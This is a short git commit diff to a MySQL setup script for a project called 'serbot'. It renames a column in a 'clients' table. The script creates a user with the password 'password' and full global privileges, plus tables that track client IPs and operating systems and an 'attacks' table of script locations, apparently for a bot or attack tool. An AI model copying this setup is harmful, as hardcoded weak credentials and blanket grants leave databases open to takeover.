3697c726dd539182315900c2b43cdbb147b23c3d
D0L0S <ricklwebb@gmail.com>
2015-05-08 16:08:52 +0100

    Update serbotdb.sql

--- serbotdb.sql
+++ serbotdb.sql
@@ -5,6 +5,6 @@ CREATE USER 'serbot'@'localhost' IDENTIFIED BY 'password';
 GRANT ALL PRIVILEGES ON *.* TO 'serbot'@'localhost' WITH GRANT OPTION;
 CREATE DATABASE serbot;
 USE serbot;
-CREATE TABLE clients (id INT, name VARCHAR(20), ip_address VARCHAR(30), os VARCHAR(30), status VARCHAR(30));
+CREATE TABLE clients (id INT, name VARCHAR(20), ip_address VARCHAR(30), os VARCHAR(30), active VARCHAR(30));
 CREATE TABLE users (id INT, first_name VARCHAR(20), last_name VARCHAR(20), email VARCHAR(30), client_id INT(10));
 CREATE TABLE attacks (id INT, name VARCHAR(20), os VARCHAR(20), script_location VARCHAR(30))
